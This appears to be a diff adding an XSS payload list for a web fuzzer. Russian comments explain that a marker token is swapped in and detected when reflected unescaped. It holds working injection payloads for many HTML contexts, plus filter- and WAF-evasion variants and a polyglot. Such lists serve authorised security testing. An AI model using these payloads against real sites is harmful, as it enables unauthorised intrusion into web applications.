@@ -1,0 +1,55 @@
+# XSS payloads. WSMARK заменяется фаззером на уникальный токен —
+# детект срабатывает, когда токен отражается в ответе без экранирования.
+# Контексты: HTML-тело, атрибут, <script>, URL, события.
+WSMARK
+"><svg/onload=alert(WSMARK)>
+"><img src=x onerror=alert(WSMARK)>
+'><img src=x onerror=alert(WSMARK)>
+<script>alert(WSMARK)</script>
+<svg><script>WSMARK</script></svg>
+"><a href="javascript:WSMARK">x</a>
+javascript:/*WSMARK*/
+"onmouseover="alert(WSMARK)
+' onfocus='alert(WSMARK)' autofocus='
+"></textarea><svg onload=alert(WSMARK)>
+</title><script>WSMARK</script>
+{{WSMARK}}
+${WSMARK}
+"><details open ontoggle=alert(WSMARK)>
+<iframe srcdoc="&lt;script&gt;WSMARK&lt;/script&gt;">
+%3Csvg%2Fonload%3Dalert(WSMARK)%3E
+"><body onpageshow=alert(WSMARK)>
+'"><WSMARKtag>
+"><input autofocus onfocus=alert(WSMARK)>
+<script>WSMARK</script>
+
+# ============================================================
+# Обфусцированные / WAF-bypass варианты (статические).
+# Доп. кодировки генерируются на лету: 03_fuzzer.py --mutations
+# ============================================================
+# разрыв имени тега/отсутствие закрывающего >
+<svg onload=alert(WSMARK)//
+<svg/onload=alert(WSMARK)>
+<svg	onload=alert(WSMARK)>
+# сущности внутри имени события/функции
+<img src=x onerror=&#97;lert(WSMARK)>
+<img src=x onerror=alert(WSMARK)>
+# fromCharCode вместо строки
+<img src=x onerror=eval(String.fromCharCode(87,83))>WSMARK
+# backtick-вызов (обход фильтра скобок)
+<img src=x onerror=alert`WSMARK`>
+# перенос строки/таб внутри javascript:
+<a href="jav&#x0A;ascript:alert(WSMARK)">x</a>
+<a href="jav	ascript:alert(WSMARK)">x</a>
+# смешанный регистр + лишние слэши
+<ScRiPt>alert(WSMARK)</sCrIpT>
+<//script><script>alert(WSMARK)</script>
+# null-байт для обрыва сигнатуры
+<scri%00pt>alert(WSMARK)</script>
+# двойное кодирование угловых скобок
+%253Cscript%253Ealert(WSMARK)%253C/script%253E
+# обход через данные-атрибут и throw
+<input onfocus=alert(WSMARK) autofocus>
+<body/onload=alert(WSMARK)>
+# полиглот (универсальный вектор для разных контекстов)
+jaVasСript:/*-/*`/*\`/*'/*"/**/(/* */oNclick=alert(WSMARK) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(WSMARK)//>
